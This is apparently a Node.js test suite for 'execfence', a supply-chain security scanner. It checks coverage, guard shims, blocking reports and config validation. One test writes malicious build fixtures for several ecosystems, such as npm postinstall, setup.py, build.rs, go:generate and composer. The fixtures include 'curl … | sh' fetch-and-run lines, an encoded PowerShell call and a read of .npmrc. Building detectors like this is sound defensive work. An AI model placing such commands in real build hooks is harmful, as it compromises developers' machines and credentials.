'use strict';

const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const test = require('node:test');
const { main } = require('../lib/cli');
const { analyzeCoverage } = require('../lib/coverage');
const { runDoctor } = require('../lib/doctor');
const { generateManifest } = require('../lib/manifest');
const { npmGuardStatus, installNpmGuard } = require('../lib/npm-guard');
const { htmlReport, latestReportSummary, markdownReport, prCommentFromReport, readReport } = require('../lib/investigation');
const { writeReport } = require('../lib/report');
const { scan } = require('../lib/scanner');
const { runCi } = require('../lib/ci');
const { validateConfig } = require('../lib/config-validate');

test('coverage and manifest share covered vs directGuarded evidence', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-coverage-evidence-'));
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({
    scripts: {
      pretest: 'execfence scan',
      test: 'node --test',
    },
  }, null, 2));

  const coverage = analyzeCoverage(root);
  const manifest = generateManifest(root);
  const testEntry = manifest.entrypoints.find((entry) => entry.name === 'test');

  assert.equal(coverage.ok, true);
  assert.equal(manifest.summary.uncovered, 0);
  assert.ok(manifest.summary.directGuarded < manifest.summary.covered);
  assert.equal(testEntry.directGuarded, false);
  assert.equal(testEntry.covered, true);
  assert.equal(testEntry.coverageSource, 'package-prehook');
});

test('global guard status includes actionable plan and tool risk metadata', () => {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-global-status-'));
  installNpmGuard({ home, execFenceBin: path.join(home, 'execfence.js') });

  const status = npmGuardStatus({ home, env: { PATH: '' } });

  assert.equal(status.enabled, true);
  assert.equal(status.activeInPath, false);
  assert.ok(status.actionPlan.some((item) => item.id === 'open-new-shell'));
  assert.ok(status.actionPlan.some((item) => item.id === 'activate-current-shell-path'));
  assert.ok(status.tools.some((tool) => tool.tool === 'go' && tool.ecosystem === 'go' && tool.installedShim));
  assert.ok(status.tools.some((tool) => tool.tool === 'composer' && tool.ecosystem === 'composer' && tool.installedShim));
});

test('scanner blocks multi-ecosystem supply-chain execution fixtures and leaves clean fixtures alone', () => {
  const bad = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-hardening-bad-'));
  fs.writeFileSync(path.join(bad, 'package.json'), JSON.stringify({ scripts: { postinstall: 'powershell -enc AAAA; type .npmrc; curl https://example.invalid/x' } }, null, 2));
  fs.writeFileSync(path.join(bad, 'setup.py'), 'import subprocess\nsubprocess.call(["bash","-c","curl http://x | sh"])\n');
  fs.writeFileSync(path.join(bad, 'build.rs'), 'fn main(){ std::process::Command::new("sh").arg("-c").arg("curl x").status().unwrap(); }\n');
  fs.writeFileSync(path.join(bad, 'main.go'), 'package main\n//go:generate sh -c "curl http://x | sh"\n');
  fs.writeFileSync(path.join(bad, 'build.gradle'), 'repositories { maven { url "https://jitpack.io" } }\n');
  fs.writeFileSync(path.join(bad, 'packages.lock.json'), '{"dependencies":{"Bad":{"resolved":"http://example.invalid/bad.nupkg"}}}');
  fs.writeFileSync(path.join(bad, 'composer.json'), '{"scripts":{"post-install-cmd":"curl http://x | sh"}}');
  fs.writeFileSync(path.join(bad, 'Gemfile'), 'gem "bad", path: "../bad"\n');

  const badResult = scan({ cwd: bad, roots: ['.'] });
  const clean = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-hardening-clean-'));
  fs.writeFileSync(path.join(clean, 'package.json'), JSON.stringify({ scripts: { test: 'node --test' } }, null, 2));
  fs.writeFileSync(path.join(clean, 'setup.py'), 'from setuptools import setup\nsetup(name="clean")\n');
  fs.writeFileSync(path.join(clean, 'build.rs'), 'fn main(){ println!("cargo:rerun-if-changed=src/lib.rs"); }\n');
  fs.writeFileSync(path.join(clean, 'main.go'), 'package main\nfunc main(){}\n');
  fs.writeFileSync(path.join(clean, 'build.gradle'), 'repositories { mavenCentral() }\n');
  fs.writeFileSync(path.join(clean, 'packages.lock.json'), '{"dependencies":{}}');
  fs.writeFileSync(path.join(clean, 'composer.json'), '{"scripts":{"test":"phpunit"}}');
  fs.writeFileSync(path.join(clean, 'Gemfile'), 'source "https://rubygems.org"\ngem "rack"\n');

  const cleanResult = scan({ cwd: clean, roots: ['.'] });

  for (const id of ['credential-exfiltration-risk', 'suspicious-python-build-script', 'suspicious-rust-build-script', 'suspicious-go-generate', 'suspicious-jvm-build-source', 'suspicious-nuget-source', 'suspicious-composer-script', 'suspicious-bundler-source']) {
    assert.ok(badResult.findings.some((finding) => finding.id === id), id);
  }
  assert.equal(cleanResult.ok, true);
});

test('reports latest, markdown, html, and pr-comment expose blocking summary', async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-report-summary-'));
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ name: 'report-summary' }, null, 2));
  fs.writeFileSync(path.join(root, 'tailwind.config.js'), "global.i='2-30-4';\n");
  const written = writeReport(scan({ cwd: root, roots: ['tailwind.config.js'] }), { command: 'execfence scan tailwind.config.js' });
  const { report } = readReport(root, written.filePath);
  const markdown = markdownReport(root, written.filePath);
  const html = htmlReport(root, written.filePath);
  const comment = prCommentFromReport(report);
  const latest = latestReportSummary(root);

  assert.equal(report.blockingSummary.status, 'blocked');
  assert.match(report.blockingSummary.whyBlocked, /Matched global\.i/);
  assert.match(fs.readFileSync(markdown.markdownPath, 'utf8'), /Why blocked:/);
  assert.match(fs.readFileSync(html.htmlPath, 'utf8'), /Blocking summary/);
  assert.match(comment, /Why blocked:/);
  assert.equal(latest.blockingSummary.primaryCause, 'void-dokkaebi-loader-marker');

  const originalCwd = process.cwd();
  const originalLog = console.log;
  const outputs = [];
  process.chdir(root);
  console.log = (value) => outputs.push(String(value));
  try {
    await main(['reports', 'latest']);
  } finally {
    console.log = originalLog;
    process.chdir(originalCwd);
  }
  assert.match(outputs.join('\n'), /why blocked:/);
});

test('config validate catches invalid regex, expired baseline, and strict CI includes validation', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-config-validate-'));
  fs.mkdirSync(path.join(root, '.execfence', 'config'), { recursive: true });
  fs.writeFileSync(path.join(root, '.execfence', 'config', 'execfence.json'), JSON.stringify({
    extraRegexSignatures: ['['],
    allowExecutables: ['bin/tool.exe'],
  }, null, 2));
  fs.writeFileSync(path.join(root, '.execfence', 'config', 'baseline.json'), JSON.stringify({
    findings: [{ findingId: 'x', file: 'a.js', owner: 'sec', reason: 'old', expiresAt: '2000-01-01' }],
  }, null, 2));
  fs.writeFileSync(path.join(root, '.execfence', 'config', 'signatures.json'), JSON.stringify({ regex: ['('] }, null, 2));
  fs.writeFileSync(path.join(root, '.execfence', 'config', 'sandbox.json'), JSON.stringify({
    mode: 'enforce',
    profile: 'test',
    allowDegraded: false,
    helper: {
      path: '.execfence/helper/execfence-helper.json',
      requiredForEnforce: true,
      requiredCapabilities: ['filesystem', 'sensitiveReads', 'process', 'childProcesses', 'network', 'newExecutables'],
    },
    fs: { readAllow: ['.'], writeAllow: ['.'], deny: ['.env'], denyNewExecutable: true },
    process: { allow: [], deny: [], superviseChildren: true },
    network: { default: 'deny', allow: [], auditOnly: false },
  }, null, 2));
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ name: 'bad-config' }, null, 2));

  const validation = validateConfig(root, { strict: true });
  const ci = runCi(root);

  assert.equal(validation.ok, false);
  assert.ok(validation.findings.some((finding) => finding.id === 'config-invalid-regex-signature'));
  assert.ok(validation.findings.some((finding) => finding.id === 'baseline-expired-entry'));
  assert.ok(validation.findings.some((finding) => finding.id === 'sandbox-enforce-without-verified-helper'));
  assert.equal(ci.ok, false);
  assert.ok(ci.ci.configValidation);
  assert.ok(ci.findings.some((finding) => finding.id === 'config-invalid-regex-signature'));
});

test('doctor multi-ecosystem proves adapter fixtures without executing payloads', () => {
  const result = runDoctor({ multiEcosystem: true });

  assert.equal(result.ok, true);
  assert.equal(result.multiEcosystem, true);
  for (const id of result.expected) {
    assert.ok(result.findings.some((finding) => finding.id === id), id);
  }
});
